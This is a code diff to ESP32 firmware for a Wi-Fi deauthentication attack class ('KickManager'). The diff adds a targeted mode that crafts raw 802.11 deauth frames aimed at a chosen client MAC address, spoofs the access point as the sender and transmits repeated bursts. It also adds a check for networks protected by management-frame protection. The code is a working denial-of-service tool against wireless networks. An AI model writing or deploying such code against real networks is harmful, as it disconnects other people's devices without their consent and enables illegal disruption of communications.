@@ -16,9 +16,10 @@ static const uint8_t DEAUTH_BROADCAST[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
 KickManager::KickManager()
     : targetChannel_(1), targetSet_(false), targetIsOwnAP_(false),
-      attacking_(false), lastBurstMs_(0), packetCount_(0),
-      targetEncryption_(WIFI_AUTH_OPEN) {
+      targetedMode_(false), attacking_(false), lastBurstMs_(0), packetCount_(0),
+      targetEncryption_(WIFI_AUTH_OPEN), targetCapabilityInfo_(0) {
   memset(targetBSSID_, 0, 6);
+  memset(targetClientMAC_, 0, 6);
   targetSSID_[0] = '\0';
   memset(deauthBuf_, 0, sizeof(deauthBuf_));
 }
@@ -53,9 +54,38 @@ void KickManager::setTargetFromScan(int scanIndex) {
     targetSSID_[0] = '\0';
   }
   targetEncryption_ = WiFi.encryptionType(scanIndex);
+  // Try to get capability info from scan result (for PMF check)
+  // Note: Arduino WiFi library doesn't expose this directly, so we'll check
+  // encryption type instead
+  targetCapabilityInfo_ = 0;
   targetSet_ = true;
   targetIsOwnAP_ =
       false; /* Атака на свою сеть разрешена по запросу пользователя */
+  targetedMode_ = false; // Reset targeted mode when setting from scan
+  memset(targetClientMAC_, 0, 6);
+}
+
+void KickManager::setTargetClient(const uint8_t *mac) {
+  if (mac == nullptr) {
+    targetedMode_ = false;
+    memset(targetClientMAC_, 0, 6);
+    return;
+  }
+  // Check if all zeros (broadcast)
+  bool allZeros = true;
+  for (int i = 0; i < 6; i++) {
+    if (mac[i] != 0) {
+      allZeros = false;
+      break;
+    }
+  }
+  if (allZeros) {
+    targetedMode_ = false;
+    memset(targetClientMAC_, 0, 6);
+  } else {
+    memcpy(targetClientMAC_, mac, 6);
+    targetedMode_ = true;
+  }
 }
 
 bool KickManager::startAttack() {
@@ -80,6 +110,14 @@ void KickManager::stopAttack() {
 }
 
 void KickManager::sendDeauthBurst() {
+  if (targetedMode_ &&
+      !(targetClientMAC_[0] == 0 && targetClientMAC_[1] == 0 &&
+        targetClientMAC_[2] == 0 && targetClientMAC_[3] == 0 &&
+        targetClientMAC_[4] == 0 && targetClientMAC_[5] == 0)) {
+    sendTargetedDeauth();
+    return;
+  }
+
   if (WiFi.getMode() == WIFI_OFF) {
     Serial.println("[KICK] WiFi is OFF, cannot send deauth packets");
     return;
@@ -143,6 +181,42 @@ void KickManager::sendDeauthBurst() {
     packetCount_++;
 }
 
+void KickManager::sendTargetedDeauth() {
+  if (WiFi.getMode() == WIFI_OFF) {
+    Serial.println("[KICK] WiFi is OFF, cannot send deauth packets");
+    return;
+  }
+
+  esp_err_t chErr = esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
+  if (chErr != ESP_OK) {
+    Serial.printf("[KICK] set_channel(%d) error: %d\n", (int)targetChannel_,
+                  (int)chErr);
+  }
+
+  // Targeted deauth: DA=client MAC, SA=AP, BSSID=AP
+  deauthBuf_[0] = 0xC0;
+  deauthBuf_[1] = 0x00;
+  deauthBuf_[2] = 0x00;
+  deauthBuf_[3] = 0x00;
+  deauthBuf_[22] = 0x00;
+  deauthBuf_[23] = 0x00;
+
+  // DA=target client MAC, SA=BSSID, BSSID=BSSID
+  memcpy(deauthBuf_ + 4, targetClientMAC_, 6); // DA
+  memcpy(deauthBuf_ + 10, targetBSSID_, 6);    // SA
+  memcpy(deauthBuf_ + 16, targetBSSID_, 6);    // BSSID
+  deauthBuf_[24] =
+      0x07; // Reason: Class 3 frame received from nonassociated station
+  deauthBuf_[25] = 0x00;
+
+  // Send multiple packets for reliability
+  for (int i = 0; i < 3; i++) {
+    if (esp_wifi_80211_tx(WIFI_IF_STA, deauthBuf_, 26, false) == ESP_OK)
+      packetCount_++;
+    delay(DEAUTH_DELAY_BETWEEN_PACKETS_MS);
+  }
+}
+
 void KickManager::tick() {
   if (!attacking_ || !targetSet_)
     return;
@@ -168,7 +242,34 @@ void KickManager::getTargetBSSIDStr(char *out, size_t maxLen) const {
            targetBSSID_[5]);
 }
 
+void KickManager::getTargetClientStr(char *out, size_t maxLen) const {
+  if (maxLen < KICK_TARGET_BSSID_LEN)
+    return;
+  if (!targetedMode_ ||
+      (targetClientMAC_[0] == 0 && targetClientMAC_[1] == 0 &&
+       targetClientMAC_[2] == 0 && targetClientMAC_[3] == 0 &&
+       targetClientMAC_[4] == 0 && targetClientMAC_[5] == 0)) {
+    snprintf(out, maxLen, "FF:FF:FF:FF:FF:FF");
+  } else {
+    snprintf(out, maxLen, "%02X:%02X:%02X:%02X:%02X:%02X", targetClientMAC_[0],
+             targetClientMAC_[1], targetClientMAC_[2], targetClientMAC_[3],
+             targetClientMAC_[4], targetClientMAC_[5]);
+  }
+}
+
 bool KickManager::isTargetProtected() const {
-  return (targetEncryption_ == WIFI_AUTH_WPA3_PSK ||
-          targetEncryption_ == WIFI_AUTH_WPA2_WPA3_PSK);
+  // Check for WPA3 (always has PMF)
+  if (targetEncryption_ == WIFI_AUTH_WPA3_PSK ||
+      targetEncryption_ == WIFI_AUTH_WPA2_WPA3_PSK) {
+    return true;
+  }
+  // Check capability info for PMF bit (bit 4 = 0x10)
+  // Note: Arduino WiFi library doesn't expose this directly, so we check
+  // encryption type. WPA2 Enterprise often uses PMF.
+  if (targetEncryption_ == WIFI_AUTH_WPA2_ENTERPRISE) {
+    return true; // Assume PMF for enterprise networks
+  }
+  // If we had capability info from beacon, check bit 4:
+  // return (targetCapabilityInfo_ & 0x10) != 0;
+  return false;
 }
